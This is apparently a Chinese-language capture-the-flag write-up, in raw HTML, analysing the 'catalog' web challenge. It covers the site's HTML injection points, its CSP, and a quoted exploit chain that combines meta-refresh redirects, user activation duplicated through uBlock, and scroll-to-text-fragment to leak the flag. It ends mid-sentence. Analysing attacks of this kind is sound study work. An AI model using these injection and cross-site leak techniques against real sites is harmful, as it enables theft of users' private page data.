TfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png" alt></p></li><li><p>&#x5728;&#x63D0;&#x4EA4; issue &#x5904;&#xFF0C;&#x6709;&#x4E00;&#x9879;&#x9700;&#x8981;&#x63D0;&#x4EA4; image URL &#x7684;&#x5730;&#x65B9;&#x4E5F;&#x5B58;&#x5728;&#x7740; HTML &#x6CE8;&#x5165;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png" alt></p></li><li><p>&#x9898;&#x76EE;&#x8BBE;&#x7F6E;&#x8FD8;&#x4F1A;&#x5229;&#x7528; session &#x6765;&#x5B58;&#x50A8;&#x4E00;&#x4E9B; HTML &#x5143;&#x7D20;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x5728;&#x540C;&#x4E00;&#x4E2A; session &#x5148;&#x767B;&#x5F55;&#xFF0C;&#x518D;&#x7528;&#x8FD9;&#x4E2A; session &#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5237;&#x65B0;&#x6211;&#x4EEC;&#x5DF2;&#x767B;&#x5F55;&#x7684;&#x9875;&#x9762;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png" alt></p></li></ol><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p></p><figure class="highlight csp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&apos;nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88&apos;</span>; <span class="hljs-keyword">img-src</span> *; <span class="hljs-keyword">font-src</span> <span class="hljs-string">&apos;self&apos;</span> fonts.gstatic.com; <span class="hljs-keyword">frame-src</span> https://www.google.com/recaptcha/</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x7ED9;&#x7684; CSP &#x662F;&#x8FD9;&#x4E9B;&#xFF0C;&#x8FD9;&#x4E9B; CSP &#x9650;&#x5236;&#x4E86;&#x6211;&#x4EEC;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E; base-uri &#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BD5;&#x56FE;&#x5229;&#x7528; HTML &#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5229;&#x7528;<code>&lt;base&gt;</code>&#x6765;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x50CF; RCTF 2018 rblog &#x90A3;&#x9053;&#x9898;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x7684;&#x63D2;&#x5165;&#x70B9;&#x5728;&#x6BD4;&#x8F83;&#x9760;&#x540E;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x63A7;&#x5236;&#x4E4B;&#x524D;&#x5F15;&#x5165;&#x6587;&#x4EF6;&#x7684; url &#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x5229;&#x7528; base uri &#x7684;&#x601D;&#x8DEF;&#x6765;&#x8FDB;&#x884C; XSS </p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><blockquote><p>Catalog has two injections: the image tag on the issue page and the username when you fail to login.  Use the image tag one with a meta redirect to get offsite.  Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.  Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3.  So now we have arbitrary content with a user activation on the correct page, but still no code exec.  (&#x2026;the rest of the exploit to come in a moment&#x2026;)</p><p>(&#x2026;continuation of previous post&#x2026;) Ok, but what can we do?  A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, <em>though this consumes the user activation</em>.  If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the <code>&lt;em&gt;</code> tag gets split into a <code>&lt;span&gt;</code> for each individual letter on load!  So you can do text searches of the form <code>#:~:text=F-,{,-X</code> for example to search for an X at the beginning of the flag.  You can specify multiple text searches to do a binary search across the whole alphabet.  Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha.  Repeat 5 or 6 times to get the whole flag.</p></blockquote><p>&#x8FD9;&#x4E00;&#x6BB5;&#x662F;&#x8D5B;&#x540E; @bluepichu &#x5728; irc &#x4E0A;&#x8BF4;&#x7684;&#x4E00;&#x6BB5;&#x8BDD;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x5BF9; catalog &#x8FD9;&#x9053;&#x9898;&#x76EE;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x7B80;&#x77ED;&#x7684; wp &#x3002;</p><p>&#x540C;&#x65F6;&#xFF0C;@lbherrera_ &#x5728;&#x8D5B;&#x540E;&#x53D1;&#x4E86;&#x4E00;&#x4E2A;&#x63A8;&#x7279;&#x516C;&#x5F00;&#x4E86;&#x4ED6;&#x4E00;&#x90E8;&#x5206;&#x672C;&#x9898;&#x7684; exp :</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/lbherrera_/status/1251994130298875904" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>Exp &#x5730;&#x5740;&#x5728;: <a href="https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b" target="_blank" rel="noopener">https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b</a></p><p>&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9057;&#x61BE;&#x7684;&#x662F;&#xFF0C;&#x8BE5;&#x4F5C;&#x8005;&#x5230;&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#x8FD8;&#x5E76;&#x672A;&#x53D1;&#x5E03;&#x4ED6;&#x81EA;&#x5DF1;&#x7684; write up &#xFF0C;&#x5982;&#x679C;&#x5927;&#x5BB6;&#x80FD;&#x770B;&#x61C2;&#x8FD9;&#x4E9B;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x9898;&#x540E;&#x9762;&#x7684;&#x90E8;&#x5206;&#x5927;&#x5BB6;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4E86;&#xFF0C;&#x540E;&#x6587;&#x4E5F;&#x5C31;&#x662F;&#x57FA;&#x672C;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#x6765;&#x5206;&#x6790;&#x8FD9;&#x4E2A;&#x9898;&#x7684;&#x3002;    </p><h3 id="User-Activation"><a href="#User-Activation" class="headerlink" title="User Activation"></a>User Activation</h3><p><strong>&#x8FD9;&#x90E8;&#x5206;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;&#x7406;&#x89E3;&#x4E5F;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x6DF1;&#x523B;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x662F;&#x6BD4;&#x8F83;&#x7C97;&#x6D45;&#x7684;&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF0C;&#x5982;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x76F4;&#x63A5;&#x6307;&#x51FA;&#x3002;</strong></p><p><strong>&#x672C;&#x90E8;&#x5206;&#x53C2;&#x8003;&#x4E3B;&#x8981;&#x662F;&#x4E24;&#x4E2A;&#x6587;&#x6863;&#xFF1A;<a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a>&#x3001;<a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a>&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x5BF9;&#x82F1;&#x6587;&#x9605;&#x8BFB;&#x7406;&#x89E3;&#x6BD4;&#x8F83;&#x597D;&#xFF0C;&#x66F4;&#x5EFA;&#x8BAE;&#x770B;&#x539F;&#x6587;</strong></p><p>&#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x770B;&#x8D77;&#x6765;&#x6BD4;&#x8F83;&#x7684;&#x5173;&#x952E;&#xFF0C;&#x51FA;&#x73B0;&#x5728;&#x4E86;&#x4F5C;&#x8005;&#x7684;&#x89E3;&#x91CA;&#x4EE5;&#x53CA; hint &#x5F53;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x4F5C;&#x8005;&#x653E; hint &#x8981;&#x7279;&#x610F;&#x7ED9; &#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x800C;&#x4E0D;&#x662F;&#x76F8;&#x5BF9;&#x4E8E;&#x66F4;&#x50CF;&#x901A;&#x4FD7;&#x7684; &#x2018;User Interaction&#x2019; &#x5462;&#xFF1F;</p><p>&#x968F;&#x4FBF;&#x641C;&#x4E00;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053; &#x2018;User Activation&#x2019; &#x5176;&#x5B9E;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x672F;&#x8BED;&#xFF1A;</p><blockquote><p>&#x200B;    User activation is the mechanism to maintain active-user-interaction state that limits use of &#x201C;abusable&#x201D; APIs (e.g. opening popups or vibrating).</p></blockquote><p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;User Activation(&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x79F0;&#x4E3A;&#x201C;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x72B6;&#x6001;&#x201D;)&#xFF0C;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x7528;&#x6237;&#x4E3B;&#x52A8;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x9650;&#x5236;&#x4E86;&#x4E00;&#x4E9B;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#xFF0C;&#x6BD4;&#x5982;&#x5F39;&#x7A97;&#x6216;&#x8005;&#x9707;&#x52A8;&#x3002;&#x201D;&#x6FC0;&#x6D3B; &#x201C;&#x72B6;&#x6001;&#x901A;&#x5E38;&#x610F;&#x5473;&#x7740;&#x7528;&#x6237;&#x5F53;&#x524D;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x8F93;&#x5165;&#x673A;&#x5236;&#xFF08;&#x6253;&#x5B57;&#x3001;&#x70B9;&#x51FB;&#x9F20;&#x6807;&#x7B49;&#xFF09;&#x4E0E;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#xFF0C;&#x6216;&#x8005;&#x7528;&#x6237;&#x5728;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x540E;&#x5B8C;&#x6210;&#x4E86;&#x67D0;&#x79CD;&#x4EA4;&#x4E92;&#x3002;</p><p>&#x6D4F;&#x89C8;&#x5668;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#x6765;&#x63A7;&#x5236;&#x5BF9;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#x8BBF;&#x95EE;&#xFF0C;&#x8FD9;&#x79CD; API &#x6700;&#x660E;&#x663E;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x901A;&#x8FC7;<code>window.open()</code>&#x6253;&#x5F00;&#x5F39;&#x51FA;&#x7A97;&#x53E3;&#x3002;&#x5F53;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x6D41;&#x6C13;&#x5F00;&#x53D1;&#x8005;&#x5F00;&#x59CB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x8BE5; API &#x4EFB;&#x610F;&#x5F39;&#x7A97;&#x540E;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x6D4F;&#x89C8;&#x5668;&#x52A0;&#x5165;&#x4E86;&#x5728;&#x7528;&#x6237;&#x672A;&#x4E3B;&#x52A8;&#x4E0E;&#x9875;&#x9762;&#x4EA4;&#x4E92;&#x65F6;&#x963B;&#x6B62;&#x5F39;&#x7A97;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECE;&#x90A3;&#x65F6;&#x8D77;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x9010;&#x6E10;&#x4F7F;&#x8BB8;&#x591A;&#x5176;&#x4ED6; API &#x4F9D;&#x8D56;&#x4E8E;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#xFF08;&#x66F4;&#x51C6;&#x786E;&#x5730;&#x8BF4;&#xFF0C;&#x4F7F;&#x5B83;&#x4EEC;&#x53D7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#xFF09;&#xFF0C;&#x6BD4;&#x5982;&#x5168;&#x5C4F;&#x3001;&#x9707;&#x52A8;&#xFF0C;&#x81EA;&#x52A8;&#x64AD;&#x653E;&#x5A92;&#x4F53;&#x7B49;&#xFF0C; Chrome &#x4E2D;&#x7EA6;&#x6709;30&#x79CD;&#x4E0D;&#x540C;&#x7684; API &#x7531;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#x3002;</p><h3 id="uBlock"><a href="#uBlock" class="headerlink" title="uBlock"></a>uBlock</h3><blockquote><p>uBlock Origin (or uBlock&#x2080;) is not an <em>ad blocker</em>; it&#x2019;s a general-purpose blocker. uBlock Origin blocks ads through its support of the <a href="https://adblockplus.org/en/filters" target="_blank" rel="noopener">Adblock Plus filter syntax</a>. uBlock Origin <a href="https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions" target="_blank" rel="noopener">extends</a> the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in <a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-deny" target="_blank" rel="noopener">default-deny mode</a>, which mode will cause <a href="https://requestpolicycontinued.github.io/#what-are-cross-site-requests" target="_blank" rel="noopener">all 3rd-party network requests</a> to be blocked by default, unless allowed by the user.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;uBlock &#x662F;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684; blocker &#xFF0C;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x81EA;&#x5B9A;&#x4E49;&#x89C4;&#x5219;&#x6765;&#x914D;&#x5408;&#x8FC7;&#x6EE4;&#x9875;&#x9762;&#x5143;&#x7D20;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x53EF;&#x4EE5;&#x5230; <a href="https://github.com/gorhill/uBlock" target="_blank" rel="noopener">uBlock</a> &#x4ED3;&#x5E93;&#x67E5;&#x770B;&#x3002;</p><p><del>&#x4E2A;&#x4EBA;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x975E;&#x5E38;&#x7406;&#x89E3;&#x4F5C;&#x8005;&#x5728;&#x6B64;&#x5904;&#x5F15;&#x5165; uBlock &#x7684;&#x70B9;&#xFF0C;&#x4EE5;&#x53CA;&#x914D;&#x5408; User Activation &#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;&#xFF0C;&#x867D;&#x7136;&#x4F5C;&#x8005;&#x89E3;&#x91CA;&#x4E86;&#x4ED6;&#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;</del>&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.    </p></blockquote><p>&#x5C31;&#x5728;&#x6211;&#x5199;&#x8FD9;&#x6BB5;&#x8BDD;&#x7684;&#x65F6;&#x5019;&#x6211;&#x5E61;&#x7136;&#x9192;&#x609F;&#xFF0C;&#x8FD9;&#x4E2A; uBlock &#x7684;&#x5F15;&#x5165;&#x5BF9;&#x4F20;&#x9012; User Activation &#x6781;&#x4E3A;&#x91CD;&#x8981;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x4E48;&#x8BF4;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5B83;&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x91CC;&#x8981;&#x5F15;&#x5165;&#x7684;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#x6709;&#x7740;&#x5341;&#x5206;&#x91CD;&#x8981;&#x7684;&#x8054;&#x7CFB;&#xFF01;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6682;&#x4E14;&#x6211;&#x4EEC;&#x628A; uBlock + User Activation &#x7684;&#x6982;&#x5FF5;&#x4EE5;&#x53CA;&#x5229;&#x7528;&#x653E;&#x4E00;&#x653E;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x770B;&#x770B;&#x600E;&#x4E48;&#x83B7;&#x53D6; flag &#x3002;</p><h3 id="How-to-get-the-FLAG"><a href="#How-to-get-the-FLAG" class="headerlink" title="How to get the FLAG"></a>How to get the FLAG</h3><ol><li>&#x5B58;&#x5728; CSP &#x9650;&#x5236;</li><li>Admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x7684; issue &#x94FE;&#x63A5;</li><li>Flag &#x5728;&#x540C;&#x57DF;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#xFF1A;<a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">http://catalog.pwni.ng/issue.php?id=3</a></li></ol><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7531; 1) &#x77E5;&#x9053;&#xFF0C;&#x4E00;&#x4E9B;&#x5229;&#x7528; scirpt &#x7684;&#x8DF3;&#x8F6C;&#x5C31;&#x5931;&#x6548;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5982;&#x4E0B;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x9875;&#x9762;&#x8DF3;&#x8F6C;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://url/&apos;&quot;</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x662F;&#x4E24;&#x4E2A; HTML &#x6CE8;&#x5165;&#xFF0C;&#x800C;&#x4E14; image url 